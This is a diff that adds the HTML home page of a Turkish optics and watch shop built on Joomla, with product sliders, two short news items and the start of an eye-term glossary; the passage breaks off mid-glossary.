@@ -1,0 +1,758 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="tr-tr" lang="tr-tr">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="Gaziantep Optik Saat" />
+  <meta name="description" content="Gaziantep Optik Saat" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Gaziantep Optik Saat</title>
+  <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/index.php?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="/templates/ja_mesolite/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="/templates/ja_mesolite/css/ja.news.css" type="text/css" />
+  <link rel="stylesheet" href="http://selcukoptik.com.tr/templates/ja_mesolite/css/ja.vm.css" type="text/css" />
+  <link rel="stylesheet" href="http://selcukoptik.com.tr/templates/ja_mesolite/css/ja.slideshow.css" type="text/css" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+
+
+<link rel="stylesheet" href="http://selcukoptik.com.tr/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="http://selcukoptik.com.tr/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="http://selcukoptik.com.tr/templates/ja_mesolite/css/template.css" type="text/css" />
+<link rel="stylesheet" href="http://selcukoptik.com.tr/templates/ja_mesolite/css/typo.css" type="text/css" />
+<link rel="stylesheet" href="http://selcukoptik.com.tr/templates/ja_mesolite/css/ja.vm.css" type="text/css" />
+
+<script language="javascript" type="text/javascript">
+	var siteurl = 'http://selcukoptik.com.tr/';
+	var tmplurl = 'http://selcukoptik.com.tr/templates/ja_mesolite';
+</script>
+
+<script language="javascript" type="text/javascript" src="http://selcukoptik.com.tr/templates/ja_mesolite/js/ja.script.js"></script>
+<!-- js for dragdrop -->
+
+<!-- Menu head -->
+			<link href="http://selcukoptik.com.tr/templates/ja_mesolite/ja_menus/ja_cssmenu/ja.cssmenu.css" rel="stylesheet" type="text/css" />
+			<script src="http://selcukoptik.com.tr/templates/ja_mesolite/ja_menus/ja_cssmenu/ja.cssmenu.js" language="javascript" type="text/javascript"></script>
+			
+<link href="http://selcukoptik.com.tr/templates/ja_mesolite/css/colors/default.css" rel="stylesheet" type="text/css" />
+
+<!--[if lte IE 6]>
+<style type="text/css">
+.clearfix {height: 1%;}
+img {border: none;}
+</style>
+<![endif]-->
+
+<!--[if gte IE 7.0]>
+<style type="text/css">
+.clearfix {display: inline-block;}
+</style>
+<![endif]-->
+
+<!--[if lte IE 6]>
+<link href="http://selcukoptik.com.tr/templates/ja_mesolite/css/ie6.php" rel="stylesheet" type="text/css" />
+<script type="text/javascript">
+window.addEvent ('load', makeTransBG);
+function makeTransBG() {
+makeTransBg($$('img'));
+}
+</script>
+<![endif]-->
+</head>
+
+<body id="bd" class="wide fs2" >
+<a name="Top" id="Top"></a>
+<ul class="accessibility">
+	<li><a href="/#ja-content" title="Skip to content">Skip to content</a></li>
+	<li><a href="/#ja-mainnav" title="Skip to main navigation">Skip to main navigation</a></li>
+	<li><a href="/#ja-col1" title="Skip to 1st column">Skip to 1st column</a></li>
+	<li><a href="/#ja-col2" title="Skip to 2nd column">Skip to 2nd column</a></li>
+</ul>
+
+<div id="ja-wrapper">
+<div id="ja-wrapper-inner" class="clearfix">
+
+<!-- BEGIN: HEADER -->
+<div id="ja-headerwrap">
+<div id="ja-header" class="clearfix">
+
+			<h1 class="logo">
+			<a href="/index.php" title="Gaziantep Optik Saat"><span>Gaziantep Optik Saat</span></a>
+		</h1>
+	
+		<div id="ja-vmcurrency">
+				<div class="moduletable">
+					<h3>Arama</h3>
+					<form action="index.php" method="post">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="Arama" class="inputbox" type="text" size="20" />	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+</form>		</div>
+	
+	</div>
+		
+		<div id="ja-vmcart">
+				<div class="moduletable">
+					<h3>Alışveriş Sepetiniz</h3>
+					<div class="vmCartModule"><div>
+   	<div class="vm-showcart">
+ 		 <a href="/index.php?page=shop.cart&amp;option=com_virtuemart&amp;Itemid=71" title="Sepeti Göster"  onclick="try{ if( !parent.GB ) return GB_showCenter('Sepeti Göster', 'http://gaziantepoptiksaat.com/index2.php?page=shop.cart&amp;option=com_virtuemart&amp;Itemid=71', 500, 600);} catch(e) { }">Sepeti Göster</a>  </div>
+  <div class="vm-total-pro clearfix">
+   Alışveriş sepetiniz boş.  </div>
+</div>
+  <hr style="clear: both;" />
+<div class="vm-total-pro clearfix">
+     </div>
+</div>		</div>
+	
+	</div>
+	
+</div>
+</div>
+<!-- END: HEADER -->
+
+<!-- BEGIN: MAIN NAVIGATION -->
+<div id="ja-mainnavwrap">
+
+	
+	<div id="ja-mainnav">
+		<ul id="ja-cssmenu" class="clearfix">
+<li class="active"><a href="http://selcukoptik.com.tr/" class="menu-item0 active first-item" id="menu1" title="Anasayfa"><span class="menu-title">Anasayfa</span></a></li> 
+<li class="havechild"><a href="/index.php?option=com_content&amp;view=category&amp;layout=blog&amp;id=41&amp;Itemid=53" class="menu-item1" id="menu53" title="Kurumsal"><span class="menu-title">Kurumsal</span></a><ul><li ><a href="/index.php?option=com_content&amp;view=article&amp;id=83&amp;Itemid=74" class=" first-item" id="menu74" title="Hakkımızda"><span class="menu-title">Hakkımızda</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=84&amp;Itemid=75"  id="menu75" title="Kalite Politikamız"><span class="menu-title">Kalite Politikamız</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=85&amp;Itemid=76"  id="menu76" title="İlkelerimiz"><span class="menu-title">İlkelerimiz</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=86&amp;Itemid=77" class=" last-item" id="menu77" title="Hedefimiz"><span class="menu-title">Hedefimiz</span></a></li> 
+</ul></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=93&amp;Itemid=58" class="menu-item2" id="menu58" title="Teslimat"><span class="menu-title">Teslimat</span></a></li> 
+<li class="havechild"><a href="/index.php?option=com_content&amp;view=category&amp;layout=blog&amp;id=42&amp;Itemid=27" class="menu-item3" id="menu27" title="Hizmetler"><span class="menu-title">Hizmetler</span></a><ul><li ><a href="/index.php?option=com_content&amp;view=article&amp;id=87&amp;Itemid=78" class=" first-item" id="menu78" title="Alışveriş Bilgileri"><span class="menu-title">Alışveriş Bilgileri</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=88&amp;Itemid=79"  id="menu79" title="Garanti Bilgileri"><span class="menu-title">Garanti Bilgileri</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=89&amp;Itemid=80"  id="menu80" title="Güvenlik ve Gizlilik"><span class="menu-title">Güvenlik ve Gizlilik</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=90&amp;Itemid=81"  id="menu81" title="İade Şartları"><span class="menu-title">İade Şartları</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=91&amp;Itemid=82"  id="menu82" title="Teslimat Bilgileri"><span class="menu-title">Teslimat Bilgileri</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=92&amp;Itemid=83" class=" last-item" id="menu83" title="Üyelik Bilgileri"><span class="menu-title">Üyelik Bilgileri</span></a></li> 
+</ul></li> 
+<li ><a href="/index.php?option=com_content&amp;view=article&amp;id=94&amp;Itemid=49" class="menu-item4" id="menu49" title="Garanti"><span class="menu-title">Garanti</span></a></li> 
+<li ><a href="/index.php?option=com_content&amp;view=category&amp;id=43&amp;Itemid=72" class="menu-item5" id="menu72" title="S.S.S."><span class="menu-title">S.S.S.</span></a></li> 
+<li ><a href="/index.php?option=com_virtuemart&amp;Itemid=71" class="menu-item6" id="menu71" title="Alışveriş"><span class="menu-title">Alışveriş</span></a></li> 
+<li ><a href="/index.php?option=com_contact&amp;view=contact&amp;id=1&amp;Itemid=73" class="menu-item7 last-item" id="menu73" title="İletişim"><span class="menu-title">İletişim</span></a></li> 
+</ul>	</div>
+
+</div>
+<!-- END: MAIN NAVIGATION -->
+
+<div id="ja-containerwrap">
+<div id="ja-container" class="clearfix">
+
+	<!-- BEGIN: CONTENT -->
+	<div id="ja-mainbody" class="clearfix">
+
+		
+		
+				
+		<!-- BEGIN: SLIDESHOW -->
+		<div id="ja-topsl1">
+			<script src="http://selcukoptik.com.tr//modules/mod_jaslideshow/ja_slideshow/ja.slideshow.js" type="text/javascript"></script>
+<div id="ja-slideshowwrap">
+<div id="ja-slideshow-case" class="ja-slideshow-case">
+<img src="http://selcukoptik.com.tr/images/stories/slideshow/1.jpg" alt="Selçuk Optik&saat" title="Selçuk Optik&saat" />
+</div>
+<div class="ja-slideshow-mask">&nbsp;</div><div id="ja-slidebar" class="ja-slidebar">
+</div>
+</div>
+
+		<script type="text/javascript">
+
+			JaSlideshow = new JaSlideshowClass({
+
+					siteurl: 'http://selcukoptik.com.tr/',
+
+					type: 'fade',
+
+					pan: '10',
+
+					zoom: '10',
+
+					width: 759,
+
+					height: 250,
+
+					url: '',
+
+					images: ['images/stories/slideshow/1.jpg','images/stories/slideshow/10.jpg','images/stories/slideshow/11.jpg','images/stories/slideshow/12.jpg','images/stories/slideshow/2.jpg','images/stories/slideshow/3.jpg','images/stories/slideshow/4.jpg','images/stories/slideshow/5.jpg','images/stories/slideshow/6.jpg','images/stories/slideshow/7.jpg','images/stories/slideshow/8.jpg','images/stories/slideshow/9.jpg'],
+
+					
+					
+					duration: [2000, 10000],
+
+					transition: Fx.Transitions.sineInOut ,
+
+					navigation: '',
+
+					classes: ['prev', 'next', 'active'],
+
+					play : '1',
+
+					thumbnailre: [/\./, 't.']
+
+					});
+
+		</script>
+
+		
+		</div>
+		<!-- END: SLIDESHOW -->
+				
+				
+		<!-- BEGIN: LATEST PRODUCTS -->
+		<div id="ja-topsl2">
+					<div class="moduletable">
+					<h3>Kampanyadaki Saatler</h3>
+					
+	<script type="text/javascript" src="http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/ja.vmproductslide.js"></script>
+	<script type="text/javascript">
+		var options={
+		    w: 159,
+		    h: 255,
+		    num_elem: 4,
+		    mode: 'horizontal', //horizontal or virtical
+		    direction: 'left', //horizontal: left or right; virtical: up or down
+			total: 6,
+			url: '',
+		    wrapper: 'ja-slider-center',
+		    duration: 2000,
+		    interval: 3000,
+			running: false,
+		    auto: 1		};
+		
+		var jsslider = null;
+	</script>
+	
+	<script type="text/javascript">
+	//<!--[CDATA[
+	function sliderInit (){
+		jsslider = new JS_Slider(options);
+		elems = $('ja-slider-center').getElementsByClassName ('vm_element');
+		for(i=0;i<elems.length;i++){
+			jsslider.update (elems[i].innerHTML, i);
+		}
+		jsslider.setPos(null);
+		if(jsslider.options.auto){
+			jsslider.nextRun();
+		}
+	}
+	
+	jaAddEvent(window, 'load', sliderInit);
+	
+	function setDirection(direction,ret){
+		jsslider.options.direction = direction;
+		if(jsslider.options.auto){
+			if(ret){
+				if(direction == 'right'){
+					$('ja-slide-left-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-left.gif';
+				}else  {
+					$('ja-slide-right-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-right.gif';
+				}
+				jsslider.options.interval = 3000;
+				jsslider.options.duration = 2000;
+			}
+			else{
+				if(direction == 'right'){
+					$('ja-slide-left-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-left-hover.gif';
+				}else  {
+					$('ja-slide-right-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-right-hover.gif';
+				}
+				jsslider.options.interval = 800;
+				jsslider.options.duration = 500;
+				jsslider.nextRun();
+			}
+		}
+		else{
+			if(ret){
+				if(direction == 'right'){
+					$('ja-slide-left-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-left.gif';
+				}else  {
+					$('ja-slide-right-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-right.gif';
+				}
+				jsslider.options.auto = 1;
+			}
+			else{
+				if(direction == 'right'){
+					$('ja-slide-left-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-left-hover.gif';
+				}else  {
+					$('ja-slide-right-img').src = 'http://selcukoptik.com.tr/modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-right-hover.gif';
+				}
+				jsslider.options.interval = 500;
+				jsslider.options.duration = 500;
+				jsslider.options.auto = 1;
+				jsslider.nextRun();
+			}		
+		}
+	}
+	//]]-->
+	</script>
+
+	<div id="ja-slider">
+		<div id="ja-slider-left" style="height: 255px; line-height: 255px;"><img src="http://selcukoptik.com.tr//modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-left.gif" id="ja-slide-left-img" alt="Left direction" onmouseover="javascript: setDirection('right',0);" onmouseout="javascript: setDirection('right',1);" title="Left direction" /></div>
+		<div id="ja-slider-center">
+		<div class="vm_element"> 
+<span style="font-weight:bold;">fossil</span>
+<br />
+
+<a title="fossil" href="/index.php?page=shop.product_details&amp;category_id=37&amp;flypage=flypage.tpl&amp;product_id=163&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Ffossil_4a9642ddc8c8d_159x207.jpg&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="fossil" border="0" /></a>
+<br />
+
+
+
+	<span class="productPrice">
+		279.00 TL			</span>
+
+
+</div><div class="vm_element"> 
+<span style="font-weight:bold;">FOSSIL</span>
+<br />
+
+<a title="FOSSIL" href="/index.php?page=shop.product_details&amp;category_id=37&amp;flypage=flypage.tpl&amp;product_id=88&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2FFOSSIL_4a92934859ab0_159x207.jpg&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="FOSSIL" border="0" /></a>
+<br />
+
+
+
+	<span class="productPrice">
+		349.00 TL			</span>
+
+
+</div><div class="vm_element"> 
+<span style="font-weight:bold;">FOSSIL</span>
+<br />
+
+<a title="FOSSIL" href="/index.php?page=shop.product_details&amp;category_id=37&amp;flypage=flypage.tpl&amp;product_id=60&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2FFOSSIL_4a928bb4c963e_159x207.jpg&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="FOSSIL" border="0" /></a>
+<br />
+
+
+
+	<span class="productPrice">
+		369.00 TL			</span>
+
+
+</div><div class="vm_element"> 
+<span style="font-weight:bold;">fossil</span>
+<br />
+
+<a title="fossil" href="/index.php?page=shop.product_details&amp;category_id=37&amp;flypage=flypage.tpl&amp;product_id=342&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Ffossil_4a98be93b16f2_159x207.jpg&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="fossil" border="0" /></a>
+<br />
+
+
+
+	<span class="productPrice">
+		339.00 TL			</span>
+
+
+</div><div class="vm_element"> 
+<span style="font-weight:bold;">Esprit</span>
+<br />
+
+<a title="Esprit" href="/index.php?page=shop.product_details&amp;category_id=38&amp;flypage=flypage.tpl&amp;product_id=68&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2FEsprit_4a9775b73be31_159x207.jpg&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="Esprit" border="0" /></a>
+<br />
+
+
+
+	<span class="productPrice">
+		147.74 TL			</span>
+
+
+</div><div class="vm_element"> 
+<span style="font-weight:bold;">Escape</span>
+<br />
+
+<a title="Escape" href="/index.php?page=shop.product_details&amp;category_id=36&amp;flypage=flypage.tpl&amp;product_id=53&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2FEscape_4a969ffe18d38_159x207.jpg&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="Escape" border="0" /></a>
+<br />
+
+
+
+	<span class="productPrice">
+		169.15 TL			</span>
+
+
+</div>		</div>
+		<div id="ja-slider-right" style="height: 255px;"><img src="http://selcukoptik.com.tr//modules/mod_ja_vmproductslide/ja_vmproductslide/img/re-right.gif" id="ja-slide-right-img" alt="Right direction" onmouseover="javascript: setDirection('left',0);" onmouseout="javascript: setDirection('left',1);" title="Right direction" /></div>
+	</div>
+	
+		</div>
+	
+		</div>
+		<!-- END: LATEST PRODUCTS -->
+				
+				
+		<!-- BEGIN: FEATURE PRODUCTS -->
+		<div id="ja-topsl3">
+					<div class="moduletable">
+					<h3>Kampanyadaki Gözlükler</h3>
+						<table border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tr>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=367&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Fosse_4a98df9fd8ddb_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=367&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=355&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Fosse_4a98db4904b12_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=355&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=365&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Fosse_4a98df2ac81ae_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=365&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=432&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2FOSSE_4a9b974829435_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=432&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+</tr>
+<tr>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=351&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Fosse_4a98da0314449_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=351&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=364&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Fosse_4a98def07b5eb_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=364&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=354&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Fosse_4a9b961406408_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=354&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+<td width="12%" align="center"> 
+<span style="font-weight:bold;">OSSE</span>
+<br />
+
+<a title="OSSE" href="/index.php?page=shop.product_details&amp;category_id=19&amp;flypage=flypage.tpl&amp;product_id=366&amp;option=com_virtuemart&amp;Itemid=71">
+	<img src="http://gaziantepoptiksaat.com/components/com_virtuemart/show_image_in_imgtag.php?filename=resized%2Fosse_4a98df6e31c39_159x207.gif&amp;newxsize=159&amp;newysize=207&amp;fileout=" alt="OSSE" border="0" /></a>
+<br />
+
+
+<a href="/index.php?page=shop.ask&amp;product_id=366&amp;subject=Fiyat%C4%B1+Bize+Sorun.%3A+OSSE&amp;option=com_virtuemart&amp;Itemid=71">Fiyatı Bize Sorun.</a>
+
+
+</td>
+</tr>
+</table>
+		</div>
+	
+		</div>
+		<!-- END: FEATURE PRODUCTS -->
+				
+				
+    		<div id="ja-content" class="clearfix">
+			<table class="blog" cellpadding="0" cellspacing="0">
+
+<tr>
+	<td valign="top">
+		<table width="100%"  cellpadding="0" cellspacing="0">
+		<tr>
+						<td valign="top" width="100%" class="article_column">
+				
+<div class="contentpaneopen">
+
+<h2 class="contentheading">
+			USB Gözlük	</h2>
+
+
+
+
+<div class="article-content">
+<p align="justify"><img src="/images/stories/1.jpg" border="0" align="left" />Güneşin zararlı etkilerinden koruyan USB çubuk...</p>Calvin Klein, 4 GB depolama alanı olan USB'li güneş gözlükleri tanıttı. Bilgisayardan uzaklaştıkça işlevini kaybeden bir ürün olarak tanımlayabileceğimiz USB bellek, Calvin Klein'ın tasarımı ile kendine yeni bir işlev buldu. Tam tersini düşünürsek, bilgisayarın başına geçmişken ekranı karartmaktan başka bir işe yaramayan güneş gözlüğü de kendine yeni bir işlev buldu.<br /><br /></div>
+
+
+	<a href="/index.php?option=com_content&amp;view=article&amp;id=107:deneme&amp;catid=3:newsflash&amp;Itemid=154" title="USB Gözlük" class="readon">
+							Devamını oku...				</a>
+
+</div>
+
+<span class="article_separator">&nbsp;</span>
+
+<div class="contentpaneopen">
+
+<h2 class="contentheading">
+			Saat Telefon	</h2>
+
+
+
+
+<div class="article-content">
+<p align="justify"><img src="/images/stories/2.jpg" border="0" align="left" />Bu kol saati, çoğu cep telefonundan daha da gelişmiş...</p>Görevimiz Tehlike ve James Bond filmlerinin klişelerinden biri daha gerçek oldu. Bu cep telefonu, hem FM bantlı radyo hem de şık bir kol saati. Boyutuna rağmen, birçok cep telefonundan eksik olmayan yetenekleri var.<br />Avrupa ve Amerika'da yakın zaman içerisinde satışa sunulacak.</div>
+
+
+	<a href="/index.php?option=com_content&amp;view=article&amp;id=106:deneme&amp;catid=3:newsflash&amp;Itemid=155" title="Saat Telefon" class="readon">
+							Devamını oku...				</a>
+
+</div>
+
+<span class="article_separator">&nbsp;</span>
+				</td>
+				</tr>
+		</table>
+	</td>
+</tr>
+
+</table>
+
+		</div>
+		
+				
+	  <!-- BEGIN: JAZIN -->
+    <div id="jazin-fp">
+    	
+
+<div id="jazin-wrap">
+<div id="jazin" class="clearfix">
+
+	  
+		<div class="jazin-left" style="width:33%">
+				<div class="jazin-boxwrap jazin-theme">		<div class="jazin-box">			<div class="jazin-content clearfix">				<h4 class="jazin-title"><a href="/index.php?option=com_content&amp;view=article&amp;id=95:goezluek-secimi&amp;catid=45:goezluek-hakknda&amp;Itemid=143" title="Gözlükler">Gözlükler</a></h4>				<img src="http://www.hurriyet.com.tr/_np/9750/7469750.jpg" width="50" alt="Gözlükler" height="50" align="right" />				Klasik kemik çerçeveler hemen herkese yakışır. Açık veya koyu tonlardan kendiniz...
+							</div><strong class="jazin-more">Makaleler:</strong>
+<ul class="jazin-links">
+  			<li>  			<a title="A harfiA taramalı : Gözün ön arka eksenini ölçmek için kullanılan ültrason.Aberasyon : Normal lokalizasyondan farklı lokalizasyon veya fonksiyondan olma hali.Ablasyon : Yerinden ayrılma, yapışık olduğundan ayrılma.Ablefaron : Doğuştan göz kapaklarının yokluğu.Ablefarus : Gelişimsel olarak göz kapaklarının yokluğu.Adezyon : Şaşılık cerrahisi sonrası, kasın etrafındaki dokulara olan yapışıklığı.Adie pupilla : Genellikle viral hastalığı takip eden sfinkter pupilla ve siliyer kasta ganglionAfaki : Katarakt cerrahisi ile göz merceğinin çıkarılması durumu.Afakik : Katarakt cerrahisi sonrası gelişen kornea endotel yetersizliği.Akne rozasea : Derideki bezlerin hastalığı. Yüzün yanak ve burun bölgesini tutar. Gözde kapak, konjonktiva ve kornea tutulumu izlenir.Albizim : Görme azalması ve gözde titreme şikayetleriyle karakterize hastalık.Allogreft : Kornea naklinde vericinin kornea dokusu. Aynı türler arasında yapılan doku nakli yaması.Amaroz : Görübilen herhangi bir hasar olmaksızın körlük durumu.A.fugaks : Optik sinirin damarsal dolaşım yetersizliğine bağlı geçici görme kaybı atakları.Ambliyopi : Görme yollarında herhangi bir bozukluk olmaksızın optik yöntemlerle düzeltilemeyen görme azlığıdır.Aniridi : Önde mercek, arkada retina ve optik sinirler tarafından çevrelenir.Anizometropi : İki gözün kırma güçleri arasında farklılık olmasıdır.Anoftalmus : Doğuştan gözlerin birisinin veya her ikisinin olmaması.Anton semptomu : Hastanın kör olmasına karşın bunun farkına varamaması durumu.Astenopi : Baş ve göz ağrısı ile birlikte refraksiyon kusurunun bulunması.Astigmatizma : Noktasal olmayan ve gözün ışığı, farklı meridyenlerde, farklı kırma özelliği. Ayrıntı için linke bakınız.BBell felci : Periferik felci. Göz kapakları kapanamaz , kornea yıkanamadığından hasar gelişebilir.Biefaofimozis : Göz kapağı aralığının ileri derecede daralması. Genellikle göz kapağı düşüklüğü ve üst kapak kıvrımında artış ile beraber görülür.Bifokal : İki farklı odağı olan, okuma ve uzak düzeltici merceklerin bir arada bulunduğu gözlüklerBiyomikroskop : Gözün ön ve arka segment yapılarının incelemesinde kullanılan iki okülere sahip mikroskop.Blefarit : Göz kapağının serbest kenarını tutan iltihaplanma.Blefaroplasti : Göz kapağı bozukluklarının düzeltilmesine yönelik ameliyatlar.Blefaroptozis : Kapak düşüklüğünün sinir ve kas felcine bağlı olduğu durum. Halk arasında göz kapağı düşüklüğü olarak bilinen "blefaroptozis" günümüzde ameliyat ile tedavi edilebilmektedir.Blefarospazm : Göz kapaklarında nedeni bilinmeyen istemsiz kasılma.Blefaroşalazis : Kapak derisi ve mukoza sertliğinin kaybına bağlı izlenen göz kapağının sarkması durumu.Botulinum toksini : Şaşılık tedavisinde kullanılan toksin madde.DDakriyoadenit : Gözyaşı bezinin iltihaplanması. Sıklıkla viraldır. Lokal duyarlılık, şişlik ve ateş klinik bulgularıdır. Dakriyolitiyazis : Gözyaşı kesesi veya gözyaşı kanallarında taş oluşması durumu.Dakriyoma : Gözyaşı kanalının herhangi bir seviyesinde tıkanmaya bağlı gözyaşı birikmesi sonucu meydana gelen tümör benzeri kistik genişlemeDakriyosistektomi : Gözyaşı kesesinin cerrahi yöntemler ile çıkarılması.Dakriyosistit 